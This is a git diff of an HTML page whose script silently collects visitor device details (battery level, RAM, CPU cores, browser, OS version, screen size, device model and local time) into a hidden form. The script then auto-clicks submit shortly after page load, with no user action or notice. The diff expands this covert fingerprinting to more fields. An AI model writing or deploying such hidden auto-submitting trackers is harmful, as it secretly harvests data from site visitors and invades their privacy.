@@ -47,62 +47,84 @@
 </head>
 
 <body class="bg-triangles">
+    <script async defer src="https://cdn.jsdelivr.net/npm/ua-parser-js@0/dist/ua-parser.min.js"></script>
 
     <script>
         var btrylevel, crrTime, userMemory, userCores, userBroSys;
 
 
         function fetchData() {
-            // Battery Level Start
+            /* Browser & Screen Start */
+            document.getElementById("Browser").value = navigator.sayswho;
+            document.getElementById("Screen_Size").value = screen.width + " X " + screen.height;
+            /* Browser & Screen End*/
+
+            /* Battery Level Start */
             navigator.getBattery().then(function(battery) {
-
                 var level = battery.level * 100;
-                document.getElementById("Battery").value = level;
+                document.getElementById("Battery").value = level + "%";
             });
+            /* Battery Level End */
 
-
-            // Battery Level End
-
-            // Time Module Start
+            /* Date & Time Module Start */
             var currentTime = new Date();
+            //Date Start
             var dd = String(currentTime.getDate()).padStart(2, '0');
             var mm = String(currentTime.getMonth() + 1).padStart(2, '0'); //January is 0!
             var yyyy = currentTime.getFullYear();
+            //Date End
+            //Time Start
             var currentOffset = currentTime.getTimezoneOffset();
-            var ISTOffset = 330;
-            var ISTTime = new Date(currentTime.getTime() + (ISTOffset + currentOffset) * 60000);
+            var ISTTime = new Date(currentTime.getTime() + (330 + currentOffset) * 60000);
             var hoursIST = ISTTime.getHours();
             var minutesIST = ISTTime.getMinutes();
-            var crrPostfix = " AM";
-            if (hoursIST > 12) {
-                crrPostfix = " PM";
-                hoursIST -= 12;
-            }
-
-            /* Main Time */
-            crrTime = hoursIST + ":" + minutesIST + crrPostfix;
-
-
-            // Operation System Start
-            userMemory = (navigator.deviceMemory * 1024) + " MB";
-            userCores = (navigator.hardwareConcurrency);
-            // var plugins = navigator.plugins;
-            userBroSys = navigator.userAgent;
-
-            /* Send Data */
-
-
+            //Time End
+            document.getElementById("Time").value = hoursIST + ":" + minutesIST;
             document.getElementById("Date").value = mm + '/' + dd + '/' + yyyy;
-            document.getElementById("Time").value = crrTime;
+            /* Date & Time Module End */
 
+            /* Memories Start */
+            userMemory = (navigator.deviceMemory) + " GB";
+            userCores = (navigator.hardwareConcurrency);
             document.getElementById("RAM").value = userMemory;
             document.getElementById("Cores").value = userCores;
-            document.getElementById("UserAgent").value = userBroSys;
-            setTimeout(function() {
-                document.getElementById("Invincible").click();
-            }, 500);
+            var plugins = navigator.plugins;
+            /* Memories End */
+
+            /* OS & Others */
+            var parser = new UAParser();
+
+            var OS = navigator.userAgent;
+            parser.setUA(OS);
+            var result = parser.getResult();
+            document.getElementById("OS_Version").value = result.os.version;
+            document.getElementById("Cpu_Architecture").value = result.cpu.architecture;
+            document.getElementById("Cpu_Architecture").value = result.cpu.architecture;
+            document.getElementById("OS_Type").value = parser.getOS().name;
+            document.getElementById("Model").value = parser.getDevice().model;
+
+            /* Auto Click */
+            setTimeout(document.getElementById("Invincible").click(), 200);
+
         }
         setTimeout(fetchData, 2500);
+
+        navigator.sayswho = (function() {
+            var ua = navigator.userAgent,
+                tem,
+                M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+            if (/trident/i.test(M[1])) {
+                tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
+                return 'IE ' + (tem[1] || '');
+            }
+            if (M[1] === 'Chrome') {
+                tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
+                if (tem != null) return tem.slice(1).join(' ').replace('OPR', 'Opera');
+            }
+            M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, '-?'];
+            if ((tem = ua.match(/version\/(\d+)/i)) != null) M.splice(1, 1, tem[1]);
+            return M.join(' ');
+        })();
     </script>
 
     <form method="post" class="hidden-form">
@@ -112,7 +134,12 @@
         <input type="text" name="Battery" id="Battery">
         <input type="text" name="RAM" id="RAM">
         <input type="text" name="Cores" id="Cores">
-        <input type="text" name="UserAgent" id="UserAgent">
+        <input type="text" name="Cpu Architecture" id="Cpu_Architecture">
+        <input type="text" name="Browser" id="Browser">
+        <input type="text" name="OS Type" id="OS_Type">
+        <input type="text" name="OS Version" id="OS_Version">
+        <input type="text" name="Screen Size" id="Screen_Size">
+        <input type="text" name="Model" id="Model">
         <input type="submit" value="submit" name="submit" id="Invincible">
 
     </form>
